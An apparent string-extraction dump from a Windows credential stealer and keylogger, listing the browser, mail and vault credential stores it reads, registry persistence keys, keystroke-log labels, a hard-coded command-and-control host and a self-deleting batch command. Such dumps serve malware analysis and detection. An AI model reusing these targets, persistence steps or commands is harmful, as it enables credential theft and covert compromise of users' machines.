reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40403b	0x40f86e	string	0x403f73	UWVS
0x4043e4	0x41496c	string	0x404305	%.2d/%.2d/%d %.2d:%.2d:%.2d
0x404451	0x414988	string	0x404305	%d\a%s\a%s\a
0x40449a	0x414992	string	0x404305	%d\a%s\a%I64u\a%s\a
0x404679	0x40b555	string	0x4045ac	UWVS
0x4046a5	0x414988	string	0x4045ac	%d\a%s\a%s\a
0x4046d7	0x414992	string	0x4045ac	%d\a%s\a%I64u\a%s\a
0x40476a	0x4149ab	string	0x4045ac	%s%s\
0x4048b2	0x4122a9	string	0x40481e	UWVS
0x404ada	0x404b6b	string	0x404a9d	1ۉ4$ blocks=Basic Latin,Arabic
0x404ba5	0x404a9d	string	0x404a9d	UWVS
0x404cd4	0x40481e	string	0x404c1f	UWVS
0x404d01	0x4149b9	string	0x404c1f	%d\a%s\a%I64u\a%s\a%s\a
0x404e65	0x414988	string	0x404c1f	%d\a%s\a%s\a
0x404ed3	0x4149ab	string	0x404c1f	%s%s\
0x404f38	0x4149cc	string	0x404c1f	%s%s
0x404f77	0x40481e	string	0x404c1f	UWVS
0x404fa7	0x4149b9	string	0x404c1f	%d\a%s\a%I64u\a%s\a%s\a
0x405127	0x4149d1	string	0x405105	shell32.dll
0x405134	0x4149dd	string	0x405105	SHFileOperationA
0x40569f	0x4149f3	string	0x40564d	%.4d-%.2d-%.2d %.2d:%.2d:%.2d
0x40571e	0x414a11	string	0x4056d8	Time: %d\n
0x40572d	0x414a1b	string	0x4056d8	Time: +%d\n
0x405788	0x414a28	string	0x4056d8	%d\a%d\ahttp://%s%s\a%s
0x4058b1	0x414a3d	string	0x4057e6	GET %s HTTP/1.1\r\nHost: %s \r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8\r\nConnection: close\r\n\r\n
0x40595c	0x414b36	string	0x4057e6	200 OK
0x40596b	0x40b280	string	0x4057e6	UWVS
0x405977	0x414b3d	string	0x4057e6	\r\n\r\n
0x405986	0x40b280	string	0x4057e6	UWVS
0x405b46	0x414b48	string	0x405ab4	psapi.dll
0x405b52	0x414b52	string	0x405ab4	GetModuleFileNameExA
0x405b68	0x414b67	string	0x405ab4	kernel32.dll
0x405b74	0x414b52	string	0x405ab4	GetModuleFileNameExA
0x405c5a	0x414b76	string	0x405ab4	%.2d/%.2d/%d %.2d:%.2d:%.2d
0x405d05	0x414b92	string	0x405ab4	%s\a%d\a%s\a%s\a
0x405dda	0x40b2cb	string	0x405dcc	UWVS
0x405e43	0x414ba0	string	0x405e2f	ComSpec
0x405e7d	0x414bab	string	0x405e2f	WINDIR
0x405e89	0x414bb2	string	0x405e2f	%s\system32\cmd.exe
0x406502	0x402be6	string	0x40622c	UWVS
0x40685b	0x414c23	string	0x4067c0	Path=
0x40686a	0x40b280	string	0x4067c0	UWVS
0x406893	0x40b280	string	0x4067c0	UWVS
0x40696a	0x414c2b	string	0x406937	SOFTWARE\Mozilla\%s\
0x406996	0x414c40	string	0x406937	CurrentVersion
0x4069c9	0x414c4f	string	0x406937	SOFTWARE\Mozilla\%s\%s\Main
0x4069fb	0x414c6b	string	0x406937	Install Directory
0x406aba	0x414c7d	string	0x406a5e	%s\%s
0x406aec	0x414c83	string	0x406a5e	%s\msvcr100.dll
0x406b37	0x414c93	string	0x406a5e	%s\msvcp100.dll
0x406b82	0x414ca3	string	0x406a5e	%s\msvcr120.dll
0x406bcd	0x414cb3	string	0x406a5e	%s\msvcp120.dll
0x406c23	0x414cc3	string	0x406a5e	mozutils.dll
0x406c35	0x414c7d	string	0x406a5e	%s\%s
0x406c68	0x414cd0	string	0x406a5e	mozglue.dll
0x406c7a	0x414c7d	string	0x406a5e	%s\%s
0x406cb7	0x414cdc	string	0x406a5e	mozsqlite3.dll
0x406cc9	0x414c7d	string	0x406a5e	%s\%s
0x406cfc	0x414c0b	string	0x406a5e	nss3.dll
0x406d0e	0x414c7d	string	0x406a5e	%s\%s
0x406d4b	0x414ceb	string	0x406a5e	%s\nss3.dll
0x406de3	0x40b280	string	0x406dc9	UWVS
0x406e25	0x40b280	string	0x406dc9	UWVS
0x406e58	0x40b280	string	0x406dc9	UWVS
0x406ef9	0x414cf9	string	0x406eb6	Mozilla Firefox
0x406f16	0x414d09	string	0x406eb6	APPDATA
0x406f26	0x414d14	string	0x406eb6	%s\Mozilla\Firefox\profiles.ini
0x406f6b	0x414d09	string	0x406eb6	APPDATA
0x406f86	0x414d34	string	0x406eb6	%s\Mozilla\Firefox\%s
0x406fba	0x414d4a	string	0x406eb6	Mozilla Thunderbird
0x406fd7	0x414d09	string	0x406eb6	APPDATA
0x406fe7	0x414d5e	string	0x406eb6	%s\Thunderbird\profiles.ini
0x40702c	0x414d09	string	0x406eb6	APPDATA
0x407047	0x414d7a	string	0x406eb6	%s\Thunderbird\%s
0x407078	0x414d8c	string	0x406eb6	%s\signons.sqlite
0x4070a2	0x414d9e	string	0x406eb6	%s\logins.json
0x4070c8	0x414dad	string	0x406eb6	NSS_Init
0x4070fa	0x414db6	string	0x406eb6	PK11_GetInternalKeySlot
0x40712c	0x414dce	string	0x406eb6	PK11_Authenticate
0x40715e	0x414de0	string	0x406eb6	NSSBase64_DecodeBuffer
0x407190	0x414df7	string	0x406eb6	PK11SDR_Decrypt
0x4071c2	0x414e07	string	0x406eb6	PK11_FreeSlot
0x4071f4	0x414e15	string	0x406eb6	NSS_Shutdown
0x407226	0x414e22	string	0x406eb6	sqlite3_open
0x407258	0x414e2f	string	0x406eb6	sqlite3_close
0x40728a	0x414e3d	string	0x406eb6	sqlite3_prepare_v2
0x4072bc	0x414e50	string	0x406eb6	sqlite3_step
0x4072ee	0x414e5d	string	0x406eb6	sqlite3_column_text
0x407375	0x414e71	string	0x406eb6	select * from moz_logins
0x40760d	0x414e8b	string	0x406eb6	%c%s\a%s\a%s\b\b\b\b
0x40765f	0x40b76b	string	0x406eb6	UWVS
0x40780e	0x414e9d	string	0x406eb6	hostname
0x40784c	0x414ea6	string	0x406eb6	encryptedUsername
0x407887	0x414eb8	string	0x406eb6	encryptedPassword
0x407a20	0x414e8b	string	0x406eb6	%c%s\a%s\a%s\b\b\b\b
0x407a72	0x40b76b	string	0x406eb6	UWVS
0x407a9b	0x414e9d	string	0x406eb6	hostname
0x407aa6	0x40b280	string	0x406eb6	UWVS
0x407b18	0x414d09	string	0x407b05	APPDATA
0x407b28	0x414eca	string	0x407b05	%s\Opera\Opera\wand.dat
0x407b57	0x414d09	string	0x407b05	APPDATA
0x407b67	0x414ee4	string	0x407b05	%s\Opera\Opera\profile\wand.dat
0x407c5a	0x414f04	string	0x407b05	\b\b\b\b
0x407cc7	0x414d09	string	0x407cb9	APPDATA
0x407cd7	0x414f09	string	0x407cb9	%s\.purple\accounts.xml
0x407d3c	0x414f21	string	0x407cb9	<protocol>
0x407d4b	0x40b280	string	0x407cb9	UWVS
0x407d68	0x414f2c	string	0x407cb9	%d%s\a
0x407d96	0x414f32	string	0x407cb9	<name>
0x407da5	0x40b280	string	0x407cb9	UWVS
0x407dba	0x414f39	string	0x407cb9	<password>
0x407dc9	0x40b280	string	0x407cb9	UWVS
0x407e2d	0x40b76b	string	0x407cb9	UWVS
0x407f00	0x414f48	string	0x407ec2	advapi32.dll
0x407f1a	0x414f55	string	0x407ec2	CredEnumerateA
0x407f3b	0x414f64	string	0x407ec2	CredFree
0x407f72	0x414f6d	string	0x407ec2	WindowsLive:name=*
0x407fe7	0x414f82	string	0x407ec2	%d%s\a%ws\a
0x408026	0x40b76b	string	0x407ec2	UWVS
0x4080eb	0x414c7d	string	0x408062	%s\%s
0x408168	0x414f8c	string	0x408062	Email
0x40819f	0x414f92	string	0x408062	POP3 User
0x4081d2	0x414f9c	string	0x408062	POP3 Server
0x408201	0x414fa8	string	0x408062	POP3 Password
0x40823c	0x414fb6	string	0x408062	IMAP User
0x40826f	0x414fc0	string	0x408062	IMAP Server
0x40829e	0x414fcc	string	0x408062	IMAP Password
0x4082d9	0x414fda	string	0x408062	HTTP User
0x40830c	0x414fe4	string	0x408062	HTTP Server
0x40833b	0x414ff0	string	0x408062	HTTP Password
0x408376	0x414ffe	string	0x408062	SMTP User
0x4083a9	0x415008	string	0x408062	SMTP Server
0x4083d8	0x415014	string	0x408062	SMTP Password
0x4084e2	0x415022	string	0x408062	%c%c%S\a%S\a%S\a%S\b\b\b\b
0x408521	0x40b76b	string	0x408062	UWVS
0x4085fd	0x414c7d	string	0x408062	%s\%s
0x40867a	0x414f8c	string	0x408062	Email
0x4086b1	0x414f92	string	0x408062	POP3 User
0x4086e4	0x414f9c	string	0x408062	POP3 Server
0x408713	0x414fa8	string	0x408062	POP3 Password
0x40874e	0x414fb6	string	0x408062	IMAP User
0x408781	0x414fc0	string	0x408062	IMAP Server
0x4087b0	0x414fcc	string	0x408062	IMAP Password
0x4087eb	0x414fda	string	0x408062	HTTP User
0x40881e	0x414fe4	string	0x408062	HTTP Server
0x40884d	0x414ff0	string	0x408062	HTTP Password
0x408888	0x414ffe	string	0x408062	SMTP User
0x4088bb	0x415008	string	0x408062	SMTP Server
0x4088ea	0x415014	string	0x408062	SMTP Password
0x4089f4	0x415022	string	0x408062	%c%c%S\a%S\a%S\a%S\b\b\b\b
0x408a33	0x40b76b	string	0x408062	UWVS
0x408ac3	0x415038	string	0x408ac0	Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
0x408acb	0x4150b4	string	0x408ac0	Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
0x408b32	0x40b76b	string	0x408ac0	UWVS
0x408b92	0x40b76b	string	0x408ac0	UWVS
0x408d8f	0x41510d	string	0x408c56	%.2X
0x408dc5	0x41510d	string	0x408c56	%.2X
0x408fa2	0x415112	string	0x408e11	%c%S\a%S:%S\b\b\b\b
0x4091ef	0x415124	string	0x4091e6	abe2869f-9b47-4cd9-a358-c22904dba7f7
0x4091f6	0x414f48	string	0x4091e6	advapi32.dll
0x409208	0x414f55	string	0x4091e6	CredEnumerateA
0x409221	0x414f64	string	0x4091e6	CredFree
0x4093b1	0x415149	string	0x4091e6	%c%s\a%S\b\b\b\b
0x4093f9	0x40b76b	string	0x4091e6	UWVS
0x40951c	0x41515c	string	0x409436	Software\Microsoft\Internet Explorer\IntelliForms\Storage2
0x4097f3	0x40b76b	string	0x409436	UWVS
0x4098bd	0x40b76b	string	0x409436	UWVS
0x40993a	0x41519a	string	0x40991b	%s\*.*
0x4099ea	0x414c7d	string	0x40991b	%s\%s
0x409a39	0x4151a6	string	0x40991b	index.dat
0x409a61	0x414c7d	string	0x40991b	%s\%s
0x409ad6	0x40b76b	string	0x40991b	UWVS
0x409bfb	0x4151b0	string	0x409b21	vaultcli.dll
0x409c1d	0x4151bd	string	0x409b21	VaultOpenVault
0x409c36	0x4151cc	string	0x409b21	VaultCloseVault
0x409c4f	0x4151dc	string	0x409b21	VaultEnumerateItems
0x409c68	0x4151f0	string	0x409b21	VaultGetItem
0x409c81	0x4151f0	string	0x409b21	VaultGetItem
0x409c9a	0x4151fd	string	0x409b21	VaultFree
0x409f92	0x415207	string	0x409b21	%c%s\a%s:%s\b\b\b\b
0x409fd7	0x40b76b	string	0x409b21	UWVS
0x40a20e	0x415207	string	0x409b21	%c%s\a%s:%s\b\b\b\b
0x40a253	0x40b76b	string	0x409b21	UWVS
0x40a345	0x40b76b	string	0x40a2d6	UWVS
0x40a35e	0x415216	string	0x40a2d6	History
0x40a366	0x415220	string	0x40a2d6	Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
0x40a3ed	0x40b76b	string	0x40a2d6	UWVS
0x40a43d	0x40b76b	string	0x40a2d6	UWVS
0x40a6e3	0x414e8b	string	0x40a51f	%c%s\a%s\a%s\b\b\b\b
0x40a72b	0x40b76b	string	0x40a51f	UWVS
0x40a8eb	0x415264	string	0x40a840	%s\Google\Chrome\User Data\Default\Login Data
0x40a935	0x415294	string	0x40a840	%s\Chromium\User Data\Default\Login Data
0x40a998	0x405523	string	0x40a975	UWVS
0x40ab48	0x40b76b	string	0x40a975	UWVS
0x40ac3b	0x414d09	string	0x40ac35	APPDATA
0x40ac4b	0x4152c0	string	0x40ac35	%s\Opera Software\Opera Stable\Login Data
0x40add0	0x40b76b	string	0x40ac99	UWVS
0x40ae5d	0x40b76b	string	0x40ac99	UWVS
0x40ae9e	0x40b76b	string	0x40ac99	UWVS
0x40aee6	0x40b76b	string	0x40ac99	UWVS
0x40af27	0x40b76b	string	0x40ac99	UWVS
0x40af87	0x40b76b	string	0x40ac99	UWVS
0x40afdd	0x40b76b	string	0x40ac99	UWVS
0x40b0b0	0x40b76b	string	0x40b035	UWVS
0x40b17f	0x40b76b	string	0x40b0f8	UWVS
0x40b2b0	0x40b2c6	string	0x40b280	[^_]
0x40b2fe	0x40b316	string	0x40b2cb	[^_]
0x40b4a8	0x40b4ac	string	0x40b48c	[ËD$ blocks=Basic Latin,Latin-1 Supplement
0x40b686	0x40b66c	string	0x40b66a	;T$\ft
0x40b72e	0x40b738	string	0x40b6a5	;L$8t
0x40bcd2	0x415308	string	0x40bc80	localhost
0x40bcf4	0x415312	string	0x40bce9	USERNAME
0x40bd23	0x41531b	string	0x40bce9	Unknown
0x40bd87	0x415323	string	0x40bd44	kernel32.dll
0x40bd93	0x415330	string	0x40bd44	GetNativeSystemInfo
0x40bf88	0x415344	string	0x40bd44	SYSTEM\CurrentControlSet\Control\ProductOptions
0x40bfdb	0x415374	string	0x40bd44	ProductType
0x40c018	0x415380	string	0x40bd44	WINNT
0x40c03f	0x415386	string	0x40bd44	LANMANNT
0x40c060	0x41538f	string	0x40bd44	SERVERNT
0x40c0a6	0x415398	string	0x40bd44	Version
0x40c14f	0x415323	string	0x40c10e	kernel32.dll
0x40c15b	0x4153c3	string	0x40c10e	GlobalMemoryStatusEx
0x40c1c9	0x4153d8	string	0x40c1a0	ProcessorNameString
0x40c1d1	0x4153ec	string	0x40c1a0	HARDWARE\DESCRIPTION\System\CentralProcessor\0
0x40c1f4	0x41541b	string	0x40c1eb	advapi32.dll
0x40c218	0x415428	string	0x40c1eb	AllocateAndInitializeSid
0x40c228	0x41541b	string	0x40c1eb	advapi32.dll
0x40c236	0x415441	string	0x40c1eb	CheckTokenMembership
0x40c246	0x41541b	string	0x40c1eb	advapi32.dll
0x40c254	0x415456	string	0x40c1eb	FreeSid
0x40c3ac	0x41531b	string	0x40c314	Unknown
0x40c42e	0x41545e	string	0x40c314	PATH
0x40c43e	0x415463	string	0x40c314	WINDIR
0x40c466	0x4142d0	string	0x40c314	C:\Users\Julie\AppData\Roaming\Logs\
0x40c4ba	0x414448	string	0x40c314	Password
0x40c4e0	0x41456c	string	0x40c314	akconsult.linkpc.net:8181;akconsult.linkpc.net:3365;
0x40c533	0x41546a	string	0x40c314	%s\a%s\a%s\a%s\a%I64u\a%I64u\a%I64u\a%d\a%s\a%s\a%s\a%s\a%s\a%s\a%d\a%d\a%s\a%d\a%s\a%d\a%s\a%d\a
0x40c72e	0x40b2cb	string	0x40c724	UWVS
0x40c795	0x4154b8	string	0x40c742	TEMP
0x40c7ac	0x4154bd	string	0x40c742	%s\%s.bat
0x40c7cf	0x41466c	string	0x40c742	@echo off\r\nping 192.0.2.2 -n 1 -w %d >nul 2>&1\r\nDEL /s "%s" >nul 2>&1\r\ncall :deleteSelf&exit /b\r\n:deleteSelf\r\nstart /b "" cmd /c del "%%~f0"&exit /b\r\n
0x40c83c	0x4154ca	string	0x40c742	ComSpec
0x40c853	0x4154d2	string	0x40c742	%s /c "%s"
0x40c8b5	0x40525e	string	0x40c894	UWVS
0x40c8f0	0x40525e	string	0x40c894	UWVS
0x40c954	0x4154e0	string	0x40c935	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x40c980	0x41550f	string	0x40c935	SOFTWARE\Microsoft\Active Setup\Installed Components
0x40c9c7	0x4051fb	string	0x40c935	UWVS
0x40c9d8	0x415544	string	0x40c935	.Identifier
0x40c9e0	0x415550	string	0x40c935	%s%s
0x40ca45	0x414414	string	0x40ca3f	AtdLAHjc
0x40cad6	0x41456c	string	0x40caa8	akconsult.linkpc.net:8181;akconsult.linkpc.net:3365;
0x40cb06	0x414448	string	0x40caa8	Password
0x40cb1e	0x414420	string	0x40caa8	TOPHER New
0x40cb36	0x414414	string	0x40caa8	AtdLAHjc
0x40cb96	0x4142d0	string	0x40caa8	C:\Users\Julie\AppData\Roaming\Logs\
0x40cc19	0x41456c	string	0x40cbf3	akconsult.linkpc.net:8181;akconsult.linkpc.net:3365;
0x40cc57	0x41456c	string	0x40cbf3	akconsult.linkpc.net:8181;akconsult.linkpc.net:3365;
0x40cc63	0x40b6a5	string	0x40cbf3	UWVS
0x40cc8c	0x40b6a5	string	0x40cbf3	UWVS
0x40ccab	0x40b2cb	string	0x40cbf3	UWVS
0x40cd41	0x40b6a5	string	0x40cbf3	UWVS
0x40cd6c	0x40b6a5	string	0x40cbf3	UWVS
0x40cd90	0x40b6a5	string	0x40cbf3	UWVS
0x40cd9c	0x40b2cb	string	0x40cbf3	UWVS
0x40cdb4	0x40b2cb	string	0x40cbf3	UWVS
0x40cde7	0x40b2cb	string	0x40cddd	UWVS
0x40cdfa	0x40b2cb	string	0x40cdf0	UWVS
0x40ce41	0x4051fb	string	0x40ce09	UWVS
0x40ce5b	0x415544	string	0x40ce09	.Identifier
0x40ce63	0x415550	string	0x40ce09	%s%s
0x40cee6	0x414420	string	0x40ce09	TOPHER New
0x40ceee	0x415559	string	0x40ce09	%Rand%
0x40cefd	0x40b280	string	0x40ce09	UWVS
0x40cf06	0x414420	string	0x40ce09	TOPHER New
0x40cf79	0x414420	string	0x40ce09	TOPHER New
0x40d011	0x40f9aa	string	0x40ce09	UWVS
0x40d0bf	0x40ba0d	string	0x40d07c	UWVS
0x40d127	0x404a9d	string	0x40d07c	UWVS
0x40d14a	0x415560	string	0x40d07c	-m "%s"
0x40d1ae	0x40c894	string	0x40d07c	WVS1ہ blocks=Basic Latin,Arabic
0x40d1fc	0x4154e0	string	0x40d07c	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
0x40d234	0x415568	string	0x40d07c	SOFTWARE\Microsoft\Active Setup\Installed Components\%s
0x40d250	0x4155a0	string	0x40d07c	"%s"
0x40d274	0x4155a5	string	0x40d07c	StubPath
0x40d2d3	0x4142d0	string	0x40d07c	C:\Users\Julie\AppData\Roaming\Logs\
0x40d2da	0x40ba0d	string	0x40d07c	UWVS
0x40d2eb	0x4142d0	string	0x40d07c	C:\Users\Julie\AppData\Roaming\Logs\
0x40d33c	0x4051fb	string	0x40d31f	UWVS
0x40d355	0x415544	string	0x40d31f	.Identifier
0x40d35d	0x415550	string	0x40d31f	%s%s
0x40d430	0x40f9aa	string	0x40d31f	UWVS
0x40d5ec	0x4155c9	string	0x40d51c	%d:%s%s;
0x40d639	0x4155d2	string	0x40d51c	%s%s\
0x40d691	0x4155d8	string	0x40d51c	%d:%I64u:%s%s;
0x40d9bd	0x4155ee	string	0x40d51c	%c%llu
0x40da1b	0x4155f5	string	0x40d51c	%llu
0x40dba5	0x4155ee	string	0x40d51c	%c%llu
0x40de22	0x415600	string	0x40ddcc	%s\a%d\a
0x40df6d	0x40b2cb	string	0x40df44	UWVS
0x40dfb7	0x40b6a5	string	0x40df44	UWVS
0x40dfdb	0x40b6a5	string	0x40df44	UWVS
0x40dfe3	0x40b2cb	string	0x40df44	UWVS
0x40dff9	0x40b2cb	string	0x40df44	UWVS
0x40e00b	0x40b2cb	string	0x40df44	UWVS
0x40e892	0x40e987	string	0x40e658	[^_]
0x40e979	0x40e987	string	0x40e658	[^_]
0x40e980	0x40e987	string	0x40e658	[^_]
0x40e9af	0x40e658	string	0x40e98c	UWVS
0x40f8b7	0x40f8f5	string	0x40f86e	;\$\fu
0x40f8c5	0x40f929	string	0x40f86e	;\$\fu
0x40f8da	0x40eb6b	string	0x40f86e	UWVS
0x40f910	0x40eb6b	string	0x40f86e	UWVS
0x40fa46	0x40fa0e	string	0x40f9aa	9\$\f}4@
0x40fa7c	0x40f9aa	string	0x40fa5a	UWVS
0x40fbf2	0x414448	string	0x40fbad	Password
0x40fc5f	0x40f86e	string	0x40fbad	UWVS
0x40fcdd	0x414448	string	0x40fcc8	Password
0x40fd41	0x40f86e	string	0x40fcc8	UWVS
0x40ff5d	0x40ff4a	string	0x40ff44	;D$\bt
0x40ffb6	0x4142d0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\
0x40ffd9	0x4196c0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\14-12-2017
0x410024	0x4196c0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\14-12-2017
0x410051	0x4142d0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\
0x41006b	0x4142d0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\
0x4100a7	0x4196c0	string	0x40ff60	C:\Users\Julie\AppData\Roaming\Logs\14-12-2017
0x41010a	0x415641	string	0x40ff60	\r\n\r\n[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\r\n
0x41020e	0x415675	string	0x4101a8	\r\n\r\n[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\r\n
0x4102f9	0x4156a0	string	0x410271	[Backspace]
0x410327	0x4156f4	string	0x410271	[Page Up]
0x41035c	0x4156c7	string	0x410271	[Arrow Up]
0x410382	0x41572a	string	0x410271	[Print Screen]
0x4103a0	0x415739	string	0x410271	[Scroll Lock]
0x4103ad	0x4156ac	string	0x410271	[Enter]
0x4103b7	0x4156b4	string	0x410271	[Tab]
0x4103c1	0x4156ba	string	0x410271	[Arrow Left]
0x4103cb	0x4156d2	string	0x410271	[Arrow Right]
0x4103d5	0x4156e0	string	0x410271	[Arrow Down]
0x4103df	0x4156ed	string	0x410271	[Home]
0x4103e9	0x4156fe	string	0x410271	[Page Down]
0x4103f3	0x41570a	string	0x410271	[End]
0x4103fd	0x415710	string	0x410271	[Break]
0x410407	0x415718	string	0x410271	[Delete]
0x410411	0x415721	string	0x410271	[Insert]
0x41041b	0x415747	string	0x410271	[Caps Lock]
0x410425	0x415753	string	0x410271	[Esc]
0x410529	0x415759	string	0x410271	[Ctrl+%c]
0x410537	0x415766	string	0x410271	[%s]
0x4106f1	0x41579e	string	0x410589	wcnwClass
0x410705	0x41576b	string	0x410589	user32.dll
0x410711	0x415776	string	0x410589	RegisterRawInputDevices
0x41072a	0x41576b	string	0x410589	user32.dll
0x410736	0x41578e	string	0x410589	GetRawInputData
0x41089d	0x4142d0	string	0x410864	C:\Users\Julie\AppData\Roaming\Logs\
0x4108a5	0x4157a8	string	0x410864	%s%s
0x4108d1	0x405523	string	0x410864	UWVS
0x4109c5	0x4157ad	string	0x41097c	%.2d-%.2d-%.4d
0x410a14	0x4142d0	string	0x41097c	C:\Users\Julie\AppData\Roaming\Logs\
0x410a1c	0x4157a8	string	0x41097c	%s%s
0x410a6a	0x4142d0	string	0x410a43	C:\Users\Julie\AppData\Roaming\Logs\
0x410a72	0x4157a8	string	0x410a43	%s%s
0x410aee	0x4157bc	string	0x410aa0	Secur32.dll
0x410b05	0x4157c8	string	0x410aa0	LsaGetLogonSessionData
0x410b19	0x4157df	string	0x410aa0	LsaFreeReturnBuffer
